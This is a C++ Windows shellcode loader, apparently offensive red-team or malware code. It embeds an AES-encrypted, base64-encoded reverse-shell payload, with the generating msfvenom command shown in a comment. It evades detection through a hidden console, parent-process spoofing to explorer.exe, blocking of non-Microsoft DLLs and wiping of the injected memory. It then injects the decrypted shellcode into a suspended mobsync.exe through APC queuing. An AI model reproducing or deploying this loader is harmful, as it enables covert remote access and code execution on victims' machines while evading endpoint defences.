#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"

// This is just directly stolen from ired.team
DWORD get_PPID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

// Process Hollowing
VOID hollow(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE explorer_handle = OpenProcess(PROCESS_ALL_ACCESS, false, get_PPID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &explorer_handle, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hollow_bin = TEXT("C:\\Windows\\System32\\mobsync.exe");
    if (!CreateProcess(
        hollow_bin,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "[!] ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T p_size = payload.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(10000);
    uint8_t overwrite[500];
    NtWriteVirtualMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);

}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
    shellcode = "97ljcbbG1+u8h58hqcnlRJR8yCF3SEFd02pYsOYH09FwJVX5tEzLpXFAjF+sraw8diKkN+Xqe3Rj6OrGM/X1EWOVz0V2d3oh3uNHgPUf5YAglof1XCuaKz9azB4XiLxxhI7vCm4BJ0dPXeDOEhgR+6VQgsmqyn0otML4V09avA4kQnSep5x88Ja8QWvbP4gyyCw7OUZv5pnSsH/FFKXs4x1nfNm/dXn4cATfEY6JXsrqNdhGcjujlQMZo6I1+44kWX9KDHktHCkDLen3EhCXJaf4QJnfI6G7oB1wfG+AWIFPZwed5P/iDj5gwGkLSzGN7RwJwhzrT/7un7CqSROE5xkio+mzRNRgE94Bew6Gx4/LEYwOMjIBvydg5vH7w+nLMew8o+U8q+wyXtsmgtCavSMs98JvBCefGSdwrP+3IA/RJ8rqtACvAOpuTDKKAMx+vM2HFGYLYPZ9UuJPJNpYTUnnB/Ve24AIR52C3nWqJ8yJeKZB3VO12cuRTZskkx1Ppdcpmvi/Ie4KIUnYDKS34EcdWXxekpVEueV1gGYSWTJ561XwHgj6NAWB87AGuAOp8mhXEaG1opGqIT+A4jlW2gNf8YrvchgcRSJTaZZF9o7dwsxxqP1RO1531h2hg0LIk7EPy6nx6xMvvoXWhlO5IZwg2tGQ4puRkdUkZA7608MFjwyooxbOxniBdqTOYF7S6RLNqgk7s3fGlDJSK9yItIOMvH+bdcAee3eURKpN9fzkQvPhXhGbRiCbwgDnbeVdlrsQNW0XHwlesK1KQd4AnYICxFGv4ASJQvGPGYzvo/2cjsALwojL+qjpSQu4Ns7qzlCiKa1+/tRC5XsAibzdT9lwgUnNhbExoTE6DiEypW2Q+kwNnws88t2jV6K2mWJzgKs1iP+NpifcCRgpY2nARgBkpp5tIvVdr/YJUa4I/NouOyqxuFtEjhxq8wJoyrtMf4/E/B2ElInc+qRzX4s8Oes4mZaNpztJqW4yaDim3hQI9SuzJ4nY38MPhtfzpNnrWw9sGiodsRh1s9lJUX5nt5KZq//QWTDt7amRTMgY46z24Iez9y1N3JBOfdpHQ3l85UkivHWiSPRKJWT6q0GrsH0bCro+alI+widhxHXP+PylkIIGoiam8slTHzTrIbZguZof9kGMJi2VYVMoM3DJ4W2zKWM5L2yrTgjVf0gWHokLWAQJV4ZUJcm01bHP6W6u0wQnY2ZcFPBCIaM+0JouPA==";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32] = {0xbf,0x9a,0x36,0xd8,0x74,0x81,0x83,0xe0,0x4b,0xec,0x7d,0xe2,0x4d,0xd9,0x0d,0xd2,0xad,0xfc,0xdc,0x17,0x9a,0x8b,0x69,0x08,0xfa,0x99,0x5b,0x17,0x4b,0x57,0x58,0xc7};
    uint8_t iv[16] = {0x3b,0x5a,0xe4,0xc9,0xdc,0xf2,0xa7,0x79,0x58,0xd4,0xdd,0x6f,0xc4,0x6d,0xeb,0x34};
    
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = ciphertext.size();
    for (int i = 0; i < c_size; i++)
    {
        if (ciphertext[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    hollow(recovered);
    return 0;
}

